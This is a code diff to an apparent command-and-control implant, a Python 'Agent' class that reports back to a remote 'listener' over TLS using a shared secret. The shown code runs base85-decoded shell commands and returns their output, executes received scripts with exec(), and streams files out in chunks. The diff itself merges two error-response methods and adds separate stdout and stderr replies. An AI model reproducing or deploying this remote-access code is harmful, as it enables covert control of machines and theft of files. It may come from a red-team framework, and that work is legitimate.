@@ -184,7 +184,7 @@ class Agent:
         try:
             file = open(filename, "rb")
         except FileNotFoundError:
-            self.respond_error("File not found!")
+            self.respond("File not found!", "AGENT_ERROR")
             return
         while True:
             chunk_data = file.read(_AGENT_OPTIONS["TRANSFER_BLOCK_SIZE"])
@@ -195,7 +195,7 @@ class Agent:
             self.send_file_segment(chunk_data, offset, os.path.basename(filename))
             offset = offset + _AGENT_OPTIONS["TRANSFER_BLOCK_SIZE"]
 
-    def respond(self, msg):
+    def respond(self, msg, code):
         """
         Respond method. Creates the following packet structure:
         Response:
@@ -205,23 +205,7 @@ class Agent:
         response_packet_stub = {
             "secret": _LISTENER_SECRET,
             "uuid": self.uuid,
-            "status": "OK",
-            "data": msg,
-        }
-        response_pkt = "_response" + json.dumps(response_packet_stub)
-        return self.tls_transact_msg(response_pkt)
-
-    def respond_error(self, msg):
-        """
-        Respond method. Creates the following packet structure:
-        Response:
-            _response{ secret:"mysecret", uuid:"myuuid", data:"cmd_response" }
-        """
-        logging.debug("Responding to listener")
-        response_packet_stub = {
-            "secret": _LISTENER_SECRET,
-            "uuid": self.uuid,
-            "status": "AGENT_ERROR",
+            "status": code,
             "data": msg,
         }
         response_pkt = "_response" + json.dumps(response_packet_stub)
@@ -235,16 +219,21 @@ class Agent:
         try:
             exec(script)
         except Exception as e:
-            error_pkt = {"status": "PAYLOAD_ERROR", "error": str(e)}
-            self.respond(error_pkt)
+            self.respond(str(e), "AGENT_ERROR")
 
     def run_command(self, command):
         logging.debug("Running a command")
         command = base64.b85decode(command).decode()
         logging.debug("Command: " + command)
-        sp = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-        sp_ret = sp.stdout.read()
-        self.respond(sp_ret.decode())
+        sp = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+
+        sp_stdout = sp.stdout.read()
+        self.respond(sp_stdout, "STDOUT")
+
+        sp_stderr = sp.stderr.read()
+        if sp_stderr != b"":
+            self.respond(sp_stderr, "STDERR")
+
 
     def write_pid_file(self):
         my_pid = str(os.getpid())
